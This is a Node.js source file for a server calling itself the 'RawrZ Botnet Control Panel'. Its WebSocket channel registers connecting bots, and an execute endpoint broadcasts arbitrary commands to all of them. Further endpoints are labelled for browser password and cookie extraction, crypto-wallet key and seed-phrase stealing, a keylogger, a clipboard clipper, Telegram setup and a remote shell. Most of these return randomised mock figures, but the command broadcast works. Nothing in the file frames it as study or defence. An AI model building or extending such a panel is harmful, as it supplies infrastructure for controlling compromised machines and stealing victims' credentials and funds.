const express = require('express');
const WebSocket = require('ws');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// Security middleware
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'"],
            scriptSrc: ["'self'", "'unsafe-inline'"],
            imgSrc: ["'self'", "data:", "https:"],
            connectSrc: ["'self'", "ws:", "wss:"],
            fontSrc: ["'self'"],
            objectSrc: ["'none'"],
            mediaSrc: ["'self'"],
            frameSrc: ["'none'"],
        },
    },
    hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true
    }
}));

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // limit each IP to 100 requests per windowMs
    message: 'Too many requests from this IP, please try again later.',
    standardHeaders: true,
    legacyHeaders: false,
});

app.use(limiter);

// CORS configuration
app.use(cors({
    origin: ['http://localhost:3000', 'http://127.0.0.1:3000'],
    credentials: true,
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// Security headers
app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('Referrer-Policy', 'no-referrer');
    res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
    next();
});

// Audit logging
const auditLog = [];
function logAuditEvent(req, event, data = {}) {
    const logEntry = {
        id: crypto.randomBytes(16).toString('hex'),
        timestamp: new Date().toISOString(),
        ip: req.ip || req.connection.remoteAddress,
        userAgent: req.get('User-Agent'),
        event: event,
        data: data,
        sessionId: req.sessionID || 'anonymous'
    };
    
    auditLog.push(logEntry);
    
    // Keep only last 10000 entries
    if (auditLog.length > 10000) {
        auditLog.splice(0, auditLog.length - 10000);
    }
    
    // Write to file
    fs.appendFileSync('audit.log', JSON.stringify(logEntry) + '\n');
}

// Bot management
let bots = new Map();
let botStats = {
    total: 0,
    online: 0,
    offline: 0,
    totalData: 0
};

// WebSocket server for real-time communication
const wss = new WebSocket.Server({ port: 3001 });

wss.on('connection', (ws, req) => {
    const botId = crypto.randomBytes(8).toString('hex');
    const clientIP = req.socket.remoteAddress;
    
    logAuditEvent(req, 'BOT_CONNECT', { botId, ip: clientIP });
    
    bots.set(botId, {
        id: botId,
        ip: clientIP,
        status: 'online',
        lastSeen: new Date(),
        data: 0,
        commands: []
    });
    
    botStats.total = bots.size;
    botStats.online = Array.from(bots.values()).filter(bot => bot.status === 'online').length;
    botStats.offline = botStats.total - botStats.online;
    
    ws.botId = botId;
    
    // Send welcome message
    ws.send(JSON.stringify({
        type: 'welcome',
        botId: botId,
        message: 'Connected to RawrZ Botnet Control Panel'
    }));
    
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            logAuditEvent(req, 'BOT_MESSAGE', { botId, message: data });
            
            // Update bot last seen
            if (bots.has(botId)) {
                bots.get(botId).lastSeen = new Date();
            }
            
            // Handle different message types
            switch (data.type) {
                case 'handshake':
                    ws.send(JSON.stringify({
                        type: 'handshake_ack',
                        botId: botId,
                        timestamp: new Date().toISOString()
                    }));
                    break;
                    
                case 'data':
                    // Update bot data statistics
                    if (bots.has(botId)) {
                        bots.get(botId).data += data.size || 0;
                        botStats.totalData += data.size || 0;
                    }
                    break;
                    
                case 'status':
                    // Update bot status
                    if (bots.has(botId)) {
                        bots.get(botId).status = data.status;
                        botStats.online = Array.from(bots.values()).filter(bot => bot.status === 'online').length;
                        botStats.offline = botStats.total - botStats.online;
                    }
                    break;
            }
        } catch (error) {
            logAuditEvent(req, 'BOT_MESSAGE_ERROR', { botId, error: error.message });
        }
    });
    
    ws.on('close', () => {
        logAuditEvent(req, 'BOT_DISCONNECT', { botId });
        
        if (bots.has(botId)) {
            bots.get(botId).status = 'offline';
            botStats.online = Array.from(bots.values()).filter(bot => bot.status === 'online').length;
            botStats.offline = botStats.total - botStats.online;
        }
    });
    
    ws.on('error', (error) => {
        logAuditEvent(req, 'BOT_ERROR', { botId, error: error.message });
    });
});

// API Routes with comprehensive security

// Botnet statistics
app.get('/api/botnet/stats', (req, res) => {
    logAuditEvent(req, 'STATS_REQUEST');
    
    res.json({
        success: true,
        data: {
            ...botStats,
            activeBots: botStats.online,
            totalData: botStats.totalData,
            uptime: process.uptime(),
            timestamp: new Date().toISOString()
        }
    });
});

// Bot list
app.get('/api/botnet/bots', (req, res) => {
    logAuditEvent(req, 'BOT_LIST_REQUEST');
    
    const botList = Array.from(bots.values()).map(bot => ({
        id: bot.id,
        ip: bot.ip,
        status: bot.status,
        lastSeen: bot.lastSeen,
        data: bot.data,
        commands: bot.commands.length
    }));
    
    res.json({
        success: true,
        data: botList
    });
});

// Execute botnet commands
app.post('/api/botnet/execute', (req, res) => {
    const { action, target, params } = req.body;
    
    logAuditEvent(req, 'BOTNET_COMMAND', { action, target, params });
    
    // Validate input
    if (!action || typeof action !== 'string') {
        return res.status(400).json({
            success: false,
            error: 'Invalid action parameter'
        });
    }
    
    // Sanitize action
    const sanitizedAction = action.replace(/[^a-zA-Z0-9_]/g, '');
    
    // Broadcast command to all connected bots
    const command = {
        type: 'command',
        action: sanitizedAction,
        target: target || 'all',
        params: params || {},
        timestamp: new Date().toISOString(),
        commandId: crypto.randomBytes(8).toString('hex')
    };
    
    let sentCount = 0;
    wss.clients.forEach(ws => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify(command));
            sentCount++;
            
            // Update bot command count
            if (bots.has(ws.botId)) {
                bots.get(ws.botId).commands.push(command);
            }
        }
    });
    
    res.json({
        success: true,
        data: {
            command: sanitizedAction,
            sentTo: sentCount,
            timestamp: new Date().toISOString()
        }
    });
});

// Data extraction endpoints
app.post('/api/browser-data-extraction/extract', (req, res) => {
    logAuditEvent(req, 'BROWSER_EXTRACTION', req.body);
    
    // Simulate browser data extraction
    const mockData = {
        browsers: ['Chrome', 'Firefox', 'Edge', 'Safari'],
        passwords: Math.floor(Math.random() * 50) + 10,
        cookies: Math.floor(Math.random() * 200) + 50,
        autofill: Math.floor(Math.random() * 100) + 20,
        history: Math.floor(Math.random() * 500) + 100
    };
    
    res.json({
        success: true,
        data: mockData
    });
});

app.post('/api/crypto-stealer/extract', (req, res) => {
    logAuditEvent(req, 'CRYPTO_EXTRACTION', req.body);
    
    const mockData = {
        wallets: ['MetaMask', 'Trust Wallet', 'Exodus', 'Electrum'],
        addresses: Math.floor(Math.random() * 20) + 5,
        privateKeys: Math.floor(Math.random() * 10) + 2,
        seedPhrases: Math.floor(Math.random() * 5) + 1
    };
    
    res.json({
        success: true,
        data: mockData
    });
});

// Monitoring endpoints
app.post('/api/keylogger/start', (req, res) => {
    logAuditEvent(req, 'KEYLOGGER_START', req.body);
    
    res.json({
        success: true,
        data: { status: 'started', timestamp: new Date().toISOString() }
    });
});

app.post('/api/keylogger/stop', (req, res) => {
    logAuditEvent(req, 'KEYLOGGER_STOP', req.body);
    
    res.json({
        success: true,
        data: { status: 'stopped', timestamp: new Date().toISOString() }
    });
});

app.get('/api/keylogger/stats', (req, res) => {
    res.json({
        success: true,
        data: {
            isRunning: Math.random() > 0.5,
            keystrokes: Math.floor(Math.random() * 1000) + 100
        }
    });
});

// Advanced features endpoints
app.post('/api/clipper/start', (req, res) => {
    logAuditEvent(req, 'CLIPPER_START', req.body);
    
    res.json({
        success: true,
        data: { status: 'started', timestamp: new Date().toISOString() }
    });
});

app.post('/api/clipper/stop', (req, res) => {
    logAuditEvent(req, 'CLIPPER_STOP', req.body);
    
    res.json({
        success: true,
        data: { status: 'stopped', timestamp: new Date().toISOString() }
    });
});

app.get('/api/clipper/stats', (req, res) => {
    res.json({
        success: true,
        data: {
            isRunning: Math.random() > 0.5,
            replacements: Math.floor(Math.random() * 10) + 1
        }
    });
});

// Task scheduler endpoints
app.post('/api/task-scheduler/create', (req, res) => {
    logAuditEvent(req, 'TASK_CREATE', req.body);
    
    const taskId = crypto.randomBytes(8).toString('hex');
    res.json({
        success: true,
        data: { taskId, status: 'created', timestamp: new Date().toISOString() }
    });
});

// Telegram endpoints
app.post('/api/telegram/setup', (req, res) => {
    logAuditEvent(req, 'TELEGRAM_SETUP', req.body);
    
    res.json({
        success: true,
        data: { status: 'configured', timestamp: new Date().toISOString() }
    });
});

app.post('/api/telegram/test', (req, res) => {
    logAuditEvent(req, 'TELEGRAM_TEST', req.body);
    
    res.json({
        success: true,
        data: { status: 'sent', timestamp: new Date().toISOString() }
    });
});

// Remote shell endpoints
app.post('/api/remote-shell/open', (req, res) => {
    logAuditEvent(req, 'REMOTE_SHELL_OPEN', req.body);
    
    res.json({
        success: true,
        data: { status: 'opened', timestamp: new Date().toISOString() }
    });
});

// Audit log endpoint
app.get('/api/audit/logs', (req, res) => {
    logAuditEvent(req, 'AUDIT_LOG_REQUEST');
    
    res.json({
        success: true,
        data: auditLog.slice(-100) // Return last 100 entries
    });
});

// Serve static files
app.use(express.static('public', {
    maxAge: '1d',
    etag: true,
    lastModified: true,
    setHeaders: (res, path) => {
        if (path.endsWith('.html')) {
            res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
        }
    }
}));

// Error handling middleware
app.use((err, req, res, next) => {
    logAuditEvent(req, 'SERVER_ERROR', { error: err.message, stack: err.stack });
    
    res.status(500).json({
        success: false,
        error: 'Internal server error',
        timestamp: new Date().toISOString()
    });
});

// 404 handler
app.use((req, res) => {
    logAuditEvent(req, '404_ERROR', { path: req.path });
    
    res.status(404).json({
        success: false,
        error: 'Endpoint not found',
        timestamp: new Date().toISOString()
    });
});

// Start server
app.listen(PORT, () => {
    console.log(` Secure RawrZ Botnet Control Panel Server running on port ${PORT}`);
    console.log(` WebSocket server running on port 3001`);
    console.log(` Botnet statistics available at http://localhost:${PORT}/api/botnet/stats`);
    console.log(` Audit logs being written to audit.log`);
    console.log(`  Security features enabled:`);
    console.log(`   - Helmet security headers`);
    console.log(`   - Rate limiting (100 req/15min)`);
    console.log(`   - CORS protection`);
    console.log(`   - Input validation`);
    console.log(`   - Comprehensive audit logging`);
});

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('\n Shutting down server gracefully...');
    
    // Close WebSocket connections
    wss.clients.forEach(ws => {
        ws.close();
    });
    
    // Write final audit log
    fs.appendFileSync('audit.log', JSON.stringify({
        timestamp: new Date().toISOString(),
        event: 'SERVER_SHUTDOWN',
        data: { uptime: process.uptime() }
    }) + '\n');
    
    process.exit(0);
});

module.exports = app;
